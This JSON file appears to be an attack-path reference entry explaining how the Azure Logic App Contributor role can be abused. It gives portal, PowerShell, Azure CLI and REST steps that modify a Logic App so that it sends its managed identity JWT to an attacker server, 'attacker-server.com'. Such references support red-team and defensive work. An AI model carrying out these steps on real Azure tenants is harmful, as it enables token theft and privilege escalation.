{
    "AZLogicAppContributor": {
        "meaning": "The Logic Contributor role grants full control of the target Logic App. This includes the ability to execute arbitrary commands on the Logic App. The abuse involves adding or modifying an existing logic app to coerce the logic app into sending a JWT for its managed identity service principal to a web server you control.",
        "common": "",
        "windows": {
            "Azure_Portal_Manual": [
                {
                    "order": 1,
                    "command": "# Navigate to Azure Portal and access the target Logic App",
                    "description": "Access Azure Portal and locate the target Logic App with contributor permissions"
                },
                {
                    "order": 2,
                    "command": "# Add HTTP action to send managed identity token to attacker-controlled server",
                    "description": "Modify Logic App workflow to include HTTP action that extracts and sends managed identity JWT"
                },
                {
                    "order": 3,
                    "command": "# Configure HTTP action with URL: https://attacker-server.com/token and body containing @{body('HTTP')}",
                    "description": "Configure HTTP action to send managed identity token to external server"
                },
                {
                    "order": 4,
                    "command": "# Trigger the Logic App workflow to execute the malicious action",
                    "description": "Execute the modified Logic App to extract managed identity JWT token"
                }
            ],
            "PowerShell_Az_Module": [
                {
                    "order": 1,
                    "command": "Connect-AzAccount",
                    "description": "Connect to Azure using PowerShell Az module"
                },
                {
                    "order": 2,
                    "command": "Get-AzLogicApp -ResourceGroupName 'ResourceGroup' -Name 'TargetLogicApp'",
                    "description": "Retrieve existing Logic App configuration"
                },
                {
                    "order": 3,
                    "command": "# Modify Logic App definition to include malicious HTTP action for token extraction",
                    "description": "Update Logic App workflow definition to extract managed identity tokens"
                },
                {
                    "order": 4,
                    "command": "Set-AzLogicApp -ResourceGroupName 'ResourceGroup' -Name 'TargetLogicApp' -DefinitionFilePath 'modified-definition.json'",
                    "description": "Apply modified Logic App definition with malicious workflow"
                }
            ]
        },
        "linux": {
            "Azure_CLI": [
                {
                    "order": 1,
                    "command": "az login",
                    "description": "Authenticate to Azure using Azure CLI"
                },
                {
                    "order": 2,
                    "command": "az logic workflow show --resource-group ResourceGroup --name TargetLogicApp",
                    "description": "Retrieve current Logic App workflow definition"
                },
                {
                    "order": 3,
                    "command": "# Modify workflow definition JSON to include HTTP action for managed identity token extraction",
                    "description": "Edit Logic App workflow to add malicious HTTP action"
                },
                {
                    "order": 4,
                    "command": "az logic workflow update --resource-group ResourceGroup --name TargetLogicApp --definition @modified-workflow.json",
                    "description": "Update Logic App with modified workflow containing token extraction logic"
                }
            ],
            "REST_API_Direct": [
                {
                    "order": 1,
                    "command": "curl -H \"Authorization: Bearer $ACCESS_TOKEN\" \"https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.Logic/workflows/{logic-app}?api-version=2016-06-01\"",
                    "description": "Retrieve Logic App workflow definition via REST API"
                },
                {
                    "order": 2,
                    "command": "# Modify the workflow definition to include malicious HTTP action for token theft",
                    "description": "Edit workflow JSON to add token extraction HTTP action"
                },
                {
                    "order": 3,
                    "command": "curl -X PUT -H \"Authorization: Bearer $ACCESS_TOKEN\" -H \"Content-Type: application/json\" \"https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.Logic/workflows/{logic-app}?api-version=2016-06-01\" -d @modified-workflow.json",
                    "description": "Update Logic App with malicious workflow via REST API"
                }
            ]
        }
    }
}
